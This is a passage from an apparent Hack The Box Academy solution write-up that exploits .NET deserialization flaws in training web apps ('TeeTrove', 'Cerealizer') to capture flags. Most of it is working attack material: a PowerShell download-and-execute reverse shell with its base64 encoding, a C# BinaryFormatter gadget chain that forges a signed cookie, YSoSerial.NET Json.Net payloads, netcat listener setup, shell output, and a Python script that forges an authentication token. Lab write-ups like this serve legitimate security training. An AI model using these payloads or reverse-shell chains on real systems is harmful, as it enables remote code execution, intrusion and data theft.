```

Afterward, students need to spawn the target machine, navigate to `http://STMIP:8000/Auth/Login`, and log in using the credentials `pentest:pentest`:

![[HTB Solutions/Others/z. images/5bd22f472df23e196b561224cd617fba_MD5.jpg]]

Then, students need to navigate to `/Tees`:

![[HTB Solutions/Others/z. images/096c5a2bb9906c8fed9dc3dfa76eac20_MD5.jpg]]

After pasting in the XML payload and changing the value of the hidden "type" field to be that of the string equivalent of `new ExpandedWrapper<XamlReader, ObjectDataProvider>().GetType().AssemblyQualifiedName`, students need to click on "Import" to trigger the exploit:

![[HTB Solutions/Others/z. images/fede93289f2715b803520ec2087fae2d_MD5.jpg]]

When checking the `nc` listener, students will notice that the reverse shell connection has been established successfully:

```
Ncat: Connection from 10.129.228.224.
Ncat: Connection from 10.129.228.224:59280.
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>whoami

iis apppool\.net v4.5
```

At last, when reading the contents of the file `C:\Windows\System32\drivers\etc\flag.txt`, students will attain the flag `HTB{xMl_5eR1aLiZaTi0N_iS_e4sy}`:

Code: cmd

```cmd
more C:\Windows\System32\drivers\etc\flag.txt
```

```
C:\windows\system32\inetsrv>more C:\Windows\System32\drivers\etc\flag.txt

HTB{xMl_5eR1aLiZaTi0N_iS_e4sy}
```

Answer: `HTB{xMl_5eR1aLiZaTi0N_iS_e4sy}`

# Example 3: Binary

## Question 1

### "Modify the payload to get a reverse shell against 'TeeTrove', and submit the contents of 'C:\\Program Files\\Internet Explorer\\flag.txt' as the answer."

Students need to construct a PowerShell payload that uploads a Windows `netcat` binary to the target machine and initiates a reverse shell connection to utilize it in the binary (base64-encoded) payload:

Code: powershell

```powershell
(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;
```

To encode the payload, students need to convert it to `UTF-16LE` (`16-bit Unicode Transformation Format Little-Endian`) and then Base64-encode it. Students can use the following Python3 one-liner to encode the payload, replacing `PAYLOAD` with the actual PowerShell one:

Code: python

```python
python3 -c 'import base64; print(base64.b64encode((r"""PAYLOAD""").encode("utf-16-le")).decode())'
```

Code: shell

```shell
python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-73ijfxwa0x]─[~]
└──╼ [★]$ python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://10.10.15.103:9001/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv 10.10.15.103 9002 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'

KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQAwADMAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgAxADAAMwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA==
```

Using the same procedures as in the section, students need to write C# code that automates the creation of the binary (base64-encoded) payload (making sure to replace `BASE64_PAYLOAD` with the actual PowerShell payload):

Code: csharp

```csharp
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Cryptography;
using System.Text;

namespace AuthCookieExploit
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Delegate stringCompare = new Comparison<string>(string.Compare);
            Comparison<string> multicastDelegate = (Comparison<string>)MulticastDelegate.Combine(stringCompare, stringCompare);
            IComparer<string> comparisonComparer = Comparer<string>.Create(multicastDelegate);

            FieldInfo fieldInfo = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invokeList = multicastDelegate.GetInvocationList();
            invokeList[1] = new Func<string, string, Process>(Process.Start);
            fieldInfo.SetValue(multicastDelegate, invokeList);
            
            SortedSet<string> sortedSet = new SortedSet<string>(comparisonComparer);
            sortedSet.Add("-WindowStyle Hidden -NonInteractive -exec bypass -enc BASE64_PAYLOAD");
            sortedSet.Add(@"C:\Windows\System32\WindowsPowerShell\V1.0\powershell.exe");

            MemoryStream memoryStream = new MemoryStream();
            BinaryFormatter binaryFormatter = new BinaryFormatter();
            binaryFormatter.Serialize(memoryStream, sortedSet);
            string payload = Convert.ToBase64String(memoryStream.ToArray());
            
            string AUTH_COOKIE_SECRET = "916344019f88b8d93993afa72b593b9c";
            SHA256 sha256 = SHA256.Create();
            byte[] hash = sha256.ComputeHash(Encoding.ASCII.GetBytes(payload + AUTH_COOKIE_SECRET));

            Console.WriteLine(payload + '.' + Convert.ToBase64String(hash));
            Console.ReadLine();
        }
    }
}
```

After running the C# code, students will attain the base64-encoded binary payload.

Students also need to download a compiled version of `nc` for Microsoft Windows from [GitHub](https://github.com/int0x33/nc.exe/raw/master/nc.exe):

Code: shell

```shell
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-73ijfxwa0x]─[~]
└──╼ [★]$ wget https://github.com/int0x33/nc.exe/raw/master/nc.exe

--2023-11-28 11:40:27--  https://github.com/int0x33/nc.exe/raw/master/nc.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
```

Additionally, students need to start an HTTP web server using the same port specified for it in the PowerShell payload to allow the target machine to fetch `nc.exe` (9001 in here):

Code: shell

```shell
python -m http.server PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xhjvsibqln]─[~]
└──╼ [★]$ python -m http.server 9001

Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Moreover, students need to start an `nc` listener to catch the reverse shell connection using the same port specified for it in the PowerShell payload (9002 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xhjvsibqln]─[~]
└──╼ [★]$ nc -nvlp 9002

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
```

Subsequently, students need to spawn the target machine, navigate to `http://STMIP:8000/Auth/Login`, and log in using the credentials `pentest:pentest`:

![[HTB Solutions/Others/z. images/5bd22f472df23e196b561224cd617fba_MD5.jpg]]

Students need to update the value of the `TTAUTH` cookie to be that of the generated payload:

![[HTB Solutions/Others/z. images/93fbf4da019ef46b13eb28aa3c0aeead_MD5.jpg]]

After refreshing the page to trigger the exploit and checking the `nc` listener, students will notice that the reverse shell connection has been established successfully:

```
Ncat: Connection from 10.129.228.224.
Ncat: Connection from 10.129.228.224:56451.
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>whoami

iis apppool\.net v4.5
```

At last, when reading the contents of the file `C:\Program Files\Internet Explorer\flag.txt`, students will attain the flag `HTB{11001011011011111011010010}`:

Code: cmd

```cmd
more "C:\Program Files\Internet Explorer\flag.txt" 
```

```
C:\windows\system32\inetsrv>more "C:\Program Files\Internet Explorer\flag.txt" 

HTB{11001011011011111011010010}
```

Answer: `HTB{11001011011011111011010010}`

# Automating Exploitation with YSoSerial.NET

## Question 1

### "Use YSoSerial.NET to generate a payload for one of the vulnerabilities in 'TeeTrove' which results in a reverse shell. Submit the contents of 'C:\\Windows\\Cursors\\flag.txt'"

After spawning the target machine in the `Decompiling .NET Applications` section (or any of the subsequent two sections), students first need to connect to it with `xfreerdp` using the credentials `htb-admin:HTB_@cademy_admin!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-admin /p:HTB_@cademy_admin! /dynamic-resolution
```

```
┌─[eu-academy-1]─[10.10.14.55]─[htb-ac-413848@htb-tc5ef6lc4z]─[~]
└──╼ [★]$ xfreerdp /v:10.129.151.192 /u:htb-admin /p:HTB_@cademy_admin! /dynamic-resolution

[11:37:35:539] [5500:5501] [INFO][com.freerdp.crypto] - creating directory /home/htb-ac-413848/.config/freerdp
[11:37:35:539] [5500:5501] [INFO][com.freerdp.crypto] - creating directory [/home/htb-ac-413848/.config/freerdp/certs]
[11:37:35:539] [5500:5501] [INFO][com.freerdp.crypto] - created directory [/home/htb-ac-413848/.config/freerdp/server]
[11:37:36:546] [5500:5501] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[11:37:36:546] [5500:5501] [WARN][com.freerdp.crypto] - CN = DESKTOP-NU10MTO
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.151.192:3389) 
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - Common Name (CN):
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - 	DESKTOP-NU10MTO
[11:37:36:546] [5500:5501] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.151.192:3389 (RDP-Server):
	Common Name: DESKTOP-NU10MTO
	Subject:     CN = DESKTOP-NU10MTO
	Issuer:      CN = DESKTOP-NU10MTO
	Thumbprint:  1a:7c:3b:e4:c5:02:e2:50:ad:36:2f:2b:df:7c:ec:18:28:ab:95:f4:3d:74:e6:0d:30:ed:b9:98:a6:5e:9f:e0
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Subsequently, students need to unzip the file `C:\Tools\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip` and then open PowerShell in the `C:\Tools\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release\` directory.

Students need to construct a PowerShell payload that uploads a Windows `netcat` binary to the target machine and initiates a reverse shell connection to utilize it in the binary (base64-encoded) payload:

Code: powershell

```powershell
(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");
c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;
```

To encode the payload, students need to convert it to `UTF-16LE` (`16-bit Unicode Transformation Format Little-Endian`) and then Base64-encode it. Students can use the following Python3 one-liner to encode the payload, replacing `PAYLOAD` with the actual PowerShell one:

Code: python

```python
python3 -c 'import base64; print(base64.b64encode((r"""PAYLOAD""").encode("utf-16-le")).decode())'
```

Code: shell

```shell
python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://PWNIP:PWNPO/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv PWNIP PWNPO -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-73ijfxwa0x]─[~]
└──╼ [★]$ python3 -c 'import base64; print(base64.b64encode((r"""(new-object net.webclient).downloadfile("http://10.10.15.103:9001/nc.exe", "c:\windows\tasks\nc.exe");c:\windows\tasks\nc.exe -nv 10.10.15.103 9002 -e c:\windows\system32\cmd.exe;""").encode("utf-16-le")).decode())'

KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQAwADMAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgAxADAAMwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA==
```

Subsequently, students need to utilize `ysoserial.exe` to generate a payload for exploiting any of the three vulnerabilities `TeeTrove` suffers from; the `Json.NET` deserialization vulnerability belonging to the `TTREMEMBER` cookie will be targeted:

Code: powershell

```powershell
.\ysoserial.exe -f Json.Net -g ObjectDataProvider --rawcmd -c "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NonInteractive -exec bypass -enc BASE64_PAYLOAD" --minify
```

```
PS C:\Tools\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -f Json.Net -g ObjectDataProvider --rawcmd -c "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NonInteractive -exec bypass -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQAwADMAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgAxADAAMwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA==" --minify

{"$type":"System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList,mscorlib,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089","$values":["C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","-WindowStyle Hidden -NonInteractive -exec bypass -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMQAwADMAOgA5ADAAMAAxAC8AbgBjAC4AZQB4AGUAIgAsACAAIgBjADoAXAB3AGkAbgBkAG8AdwBzAFwAdABhAHMAawBzAFwAbgBjAC4AZQB4AGUAIgApADsAYwA6AFwAdwBpAG4AZABvAHcAcwBcAHQAYQBzAGsAcwBcAG4AYwAuAGUAeABlACAALQBuAHYAIAAxADAALgAxADAALgAxADUALgAxADAAMwAgADkAMAAwADIAIAAtAGUAIABjADoAXAB3AGkAbgBkAG8AdwBzAFwAcwB5AHMAdABlAG0AMwAyAFwAYwBtAGQALgBlAHgAZQA7AA=="]},"ObjectInstance":{"$type":"System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089"}}
```

Students also need to download a compiled version of `nc` for Microsoft Windows from [GitHub](https://github.com/int0x33/nc.exe/raw/master/nc.exe):

Code: shell

```shell
wget https://github.com/int0x33/nc.exe/raw/master/nc.exe
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-73ijfxwa0x]─[~]
└──╼ [★]$ wget https://github.com/int0x33/nc.exe/raw/master/nc.exe

--2023-11-28 11:40:27--  https://github.com/int0x33/nc.exe/raw/master/nc.exe
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
```

Additionally, students need to start an HTTP web server using the same port specified for it in the PowerShell payload to allow the target machine to fetch `nc.exe` (9001 in here):

Code: shell

```shell
python -m http.server PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xhjvsibqln]─[~]
└──╼ [★]$ python -m http.server 9001

Serving HTTP on 0.0.0.0 port 9001 (http://0.0.0.0:9001/) ...
```

Moreover, students need to start an `nc` listener to catch the reverse shell connection using the same port specified for it in the PowerShell payload (9002 in here):

Code: shell

```shell
nc -nvlp PWNPO
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-xhjvsibqln]─[~]
└──╼ [★]$ nc -nvlp 9002

Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9002
Ncat: Listening on 0.0.0.0:9002
```

Afterward, students need to spawn the target machine, navigate to `http://STMIP:8000/Auth/Login`, and login using the credentials `pentest:pentest`, making sure to check the `Remember me` checkbox:

![[HTB Solutions/Others/z. images/d8529b795b2b1d49a6dbf73a821339d6_MD5.jpg]]

Students need to update the value of the `TTREMEMBER` cookie to be that of the `YSoSerial.Net` generated payload:

![[HTB Solutions/Others/z. images/56d95fb758d18bd6de3369a1255d2370_MD5.jpg]]

After logging out to trigger the exploit and checking the `nc` listener, students will notice that the reverse shell connection has been established successfully:

```
Ncat: Connection from 10.129.228.224.
Ncat: Connection from 10.129.228.224:56451.
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

C:\windows\system32\inetsrv>whoami

iis apppool\.net v4.5
```

At last, when reading the contents of `C:\Windows\Cursors\flag.txt`, students will attain the flag `HTB{whY_s0_S3r1ouS}`:

Code: cmd

```cmd
more C:\Windows\Cursors\flag.txt
```

```
C:\windows\system32\inetsrv>more C:\Windows\Cursors\flag.txt

HTB{whY_s0_S3r1ouS}
```

Answer: `HTB{whY_s0_S3r1ouS}`

# Skills Assessment

## Question 1

### "Identify the deserialization vulnerability in the website, and exploit it to achieve remote code execution. Submit the contents of 'C:\\Users\\Public\\flag.txt' as the answer."

Students first need to download [Cerealizer.Publish.zip](https://academy.hackthebox.com/storage/modules/240/Cerealizer.Publish.zip) and unzip it:

Code: shell

```shell
wget https://academy.hackthebox.com/storage/modules/240/Cerealizer.Publish.zip && unzip Cerealizer.Publish.zip
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-izydwe0aox]─[~]
└──╼ [★]$ wget https://academy.hackthebox.com/storage/modules/240/Cerealizer.Publish.zip && unzip Cerealizer.Publish.zip

--2023-11-30 18:50:45--  https://academy.hackthebox.com/storage/modules/240/Cerealizer.Publish.zip
Resolving academy.hackthebox.com (academy.hackthebox.com)... 104.18.20.126, 104.18.21.126, 2606:4700::6812:147e, ...
Connecting to academy.hackthebox.com (academy.hackthebox.com)|104.18.20.126|:443... connected.
HTTP request sent, awaiting response... 200 OK
<SNIP>
```

To analyze the source code dynamically and test exploits locally (which is highly encouraged), students can use the Windows VM provided in the `Decompiling .NET Applications` section (or any of the subsequent two sections); however, for static analysis only, `Pwnbox` alone suffices, as students can use [AvaloniaILSpy](https://github.com/icsharpcode/AvaloniaILSpy) for the decompilation of the (binary) deployment files.

To use `AvaloniaILSpy`, students need to download the latest [Linux x64 release](https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip), and then unzip `Linux.x64.Release.zip` and `ILSpy-linux-x64-Release.zip`:

Code: shell

```shell
wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip && unzip Linux.x64.Release.zip && unzip ILSpy-linux-x64-Release.zip
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-jjjdthanig]─[~]
└──╼ [★]$ wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip && unzip Linux.x64.Release.zip && unzip ILSpy-linux-x64-Release.zip

--2023-11-30 19:51:28--  https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
Resolving github.com (github.com)... 20.205.243.166
Connecting to github.com (github.com)|20.205.243.166|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
```

Afterward, students need to launch `ILSpy`:

Code: shell

```shell
./artifacts/linux-x64/ILSpy
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-jjjdthanig]─[~]
└──╼ [★]$ ./artifacts/linux-x64/ILSpy
```

Subsequently, students need to open (by pressing `Ctrl` + `O`) `Cerealizer.dll` from `Cerealizer.Publish/bin/`:

![[HTB Solutions/Others/z. images/36ebb5a3038670986112177a6d4388a5_MD5.jpg]]

When hunting for deserialization of user-controlled data throughout the codebase (using either automated or manual methods), students will find that instead of setting it to `None`, the authenticated HTTP POST `Load` endpoint in `Cerealizer.Controllers.ProfileController` sets [TypeNameHandling](https://www.newtonsoft.com/json/help/html/P_Newtonsoft_Json_JsonSerializer_TypeNameHandling.htm) to `Auto` when deserializing the parameter `body` with `Json.NET`, resulting in a deserialization vulnerability:

Code: csharp

```csharp
<SNIP>
		JsonSerializerSettings settings = new JsonSerializerSettings();
		settings.TypeNameHandling = TypeNameHandling.Auto;
		settings.TypeNameAssemblyFormatHandling = TypeNameAssemblyFormatHandling.Full;
		JsonConvert.DeserializeObject(body, settings);
		return "OK";
<SNIP>
```

![[HTB Solutions/Others/z. images/dd71c74bb8ad1f365db13ff60842f3b9_MD5.jpg]]

However, before performing the unsafe deserialization, one of the checks the endpoint performs is invoking the `Cerealizer.Auth.DevToken.Validate` function on the value of the custom-HTTP header `SecureAuth.DevToken` (i.e., the value of the field `Cerealizer.Auth.DevToken.HeaderName`) passed in the request:

Code: csharp

```csharp
<SNIP>
	if (DevToken.Validate(base.Request.get_Headers()[DevToken.HeaderName]))
<SNIP>
```

When analyzing the source code of `Cerealizer.Auth.DevToken`, students will notice that its functions' signatures are obfuscated:

![[HTB Solutions/Others/z. images/b6d6b44f7b9485b4872d9e73cf8cff2d_MD5.jpg]]

To deobfuscate them, students need to read and understand the implementation of each function and rename it accordingly, in addition to removing any unnecessary code (although not encouraged, students can utilize an LLM at [chat.lmsys](https://chat.lmsys.org/) for aid, making sure the `Max output tokens` parameter is set to the maximum value):

Code: csharp

```csharp
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class DevToken
{
    public static readonly string HeaderName = "SecureAuth.DevToken";

    private static AesManaged CreateAESManager() { return new AesManaged(); }

    private static ICryptoTransform CreateDecryptor(AesManaged aesManaged, byte[] key, byte[] iv)
    {
        return aesManaged.CreateDecryptor(key, iv);
    }

    private static void XORKeyAndIV(byte[] keyXORBytes, byte[] ivXORBytes, out byte[] key, out byte[] iv)
    {
        key = (byte[])keyXORBytes.Clone();
        iv = (byte[])ivXORBytes.Clone();
        for (int i = 0; i < 16; i++)
        {
            key[i] = (byte)(keyXORBytes[i] ^ 0x58u);
            iv[i] = (byte)(ivXORBytes[i] ^ 0x4Du);
        }
    }

    private static void XOR55(byte[] inputBytes, out byte[] outputBytes)
    {
        outputBytes = (byte[])inputBytes.Clone();
        for (int i = 0; i < inputBytes.Length; i++)
        {
            outputBytes[i] ^= 55;
        }
    }

    private static MemoryStream CreateMemoryStream(byte[] inputBytes)
    {
        return new MemoryStream(inputBytes);
    }

    private static byte[] DecodeBase64(string base64String)
    {
        return Convert.FromBase64String(base64String);
    }

    private static CryptoStream CreateCryptoStream(MemoryStream memoryStream, ICryptoTransform cryptoTransform)
    {
        return new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read);
    }

    private static StreamReader CreateStreamReader(CryptoStream cryptoStream)
    {
        return new StreamReader(cryptoStream);
    }

    private static string ReadStreamToEnd(StreamReader streamReader)
    {
        return streamReader.ReadToEnd();
    }

    private static bool AreStringsEqual(string inputString, string inputString2)
    {
        return string.Compare(inputString, inputString2) == 0;
    }

    private static string GetString(byte[] inputBytes)
    {
        return Encoding.UTF8.GetString(inputBytes);
    }

    private static bool IsStringNullOrEmpty(string inputString)
    {
        return string.IsNullOrEmpty(inputString);
    }

    private static bool AreBytesEqual(byte[] inputBytes, byte[] inputBytes2)
    {
        return inputBytes.Equals(inputBytes2);
    }

    public static bool Validate(string encryptedToken)
    {
        byte[] keyXORBytes = new byte[16] { 43, 61, 59, 45, 42, 49, 44, 33, 118, 62, 55, 42, 118, 54, 55, 47 };
        byte[] ivXORBytes = new byte[16] { 36, 35, 36, 57, 36, 44, 33, 36, 55, 40, 41, 99, 35, 40, 53, 57 };
        byte[] plaintextXORBytes = new byte[27] { 127, 99, 117, 76, 68, 4, 84, 69, 4, 99, 104, 83, 4, 65, 4,
         123, 7, 71, 4, 101, 104, 67, 7, 92, 82, 89, 74 };

        if (IsStringNullOrEmpty(encryptedToken))
        {
            return false;
        }

        XOR55(plaintextXORBytes, out var plaintextBytes);
        XORKeyAndIV(keyXORBytes, ivXORBytes, out var key, out var iv);

        try
        {
            string decryptedToken;
            AesManaged aesManaged = CreateAESManager();
            ICryptoTransform cryptoTransform = CreateDecryptor(aesManaged, key, iv);
            using (MemoryStream memoryStream = CreateMemoryStream(DecodeBase64(encryptedToken)))
            using (CryptoStream cryptoStream = CreateCryptoStream(memoryStream, cryptoTransform))
            using (StreamReader streamReader = CreateStreamReader(cryptoStream))
            {
                decryptedToken = ReadStreamToEnd(streamReader);
            }

            return AreStringsEqual(decryptedToken, GetString(plaintextBytes));
        }
        catch
        {
            return false;
        }
    }
}
```

Based on the deobfuscated code, students will deduce that the `Validate` function uses AES to decrypt the parameter passed to it and compares it with the plaintext `HTB{s3cr3T_d3v3L0p3R_t0ken}` (which is the result of `plaintextXORBytes` XORed with 55).

Therefore, students need to build an encryptor that encrypts the string `HTB{s3cr3T_d3v3L0p3R_t0ken}` with AES, utilizing the same `key` and `iv`; additionally, students need to make sure to use [PKCS7 padding](https://cryptography.io/en/latest/hazmat/primitives/padding/#module-cryptography.hazmat.primitives.padding), due to `HTB{s3cr3T_d3v3L0p3R_t0ken}` being only 27 characters. One example of such an encryptor can be written in Python (in case [pycryptodome](https://pycryptodome.readthedocs.io/en/latest/index.html) is not installed, students need to install it using the command `pip3 install pycryptodome` to be able to utilize [AES](https://pycryptodome.readthedocs.io/en/latest/src/cipher/aes.html) from the [Crypto.Cipher](https://pycryptodome.readthedocs.io/en/latest/src/cipher/cipher.html) package):

Code: python

```python
from Crypto.Cipher import AES
from base64 import b64encode

keyXORBytes = bytes([43, 61, 59, 45, 42, 49, 44, 33, 118, 62, 55, 42, 118, 54, 55, 47])
ivXORBytes = bytes([36, 35, 36, 57, 36, 44, 33, 36, 55, 40, 41, 99, 35, 40, 53, 57])
plaintextXORBytes = bytes([127, 99, 117, 76, 68, 4, 84, 69, 4, 99, 104, 83, 4, 65, 4, 
						   123, 7, 71, 4, 101, 104, 67, 7, 92, 82, 89, 74])

def XOR55(inputBytes):
    return bytes(byte ^ 55 for byte in inputBytes)

def XORKeyAndIV(keyXORBytes, ivXORBytes):
    key = (byte ^ 0x58 for byte in keyXORBytes)
    iv = (byte ^ 0x4D for byte in ivXORBytes)
    return bytes(key), bytes(iv)

def pkcs7_pad(data, block_size):
    padding_size = block_size - len(data) % block_size
    padding = bytes([padding_size] * padding_size)
    return data + padding

def encrypt(plaintextBytes, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pkcs7_pad(plaintextBytes, AES.block_size))
    return ciphertext

def main():
    plaintextBytes = XOR55(plaintextXORBytes)
    key, iv = XORKeyAndIV(keyXORBytes, ivXORBytes)
    encryptedText = encrypt(plaintextBytes, key, iv)
    print(b64encode(encryptedText).decode("utf-8"))

main()
```

After running the script, students will attain the encrypted text `B5ZUxo++Co3/ReO5flLYBA8KxRgK4Ts3nnsP/Fohod0=`:

Code: shell

```shell
python3 AESEncrypt.py
```

```
┌─[us-academy-1]─[10.10.15.103]─[htb-ac-413848@htb-0pdsuufhyt]─[~]
└──╼ [★]$ python3 AESEncrypt.py

B5ZUxo++Co3/ReO5flLYBA8KxRgK4Ts3nnsP/Fohod0=
```

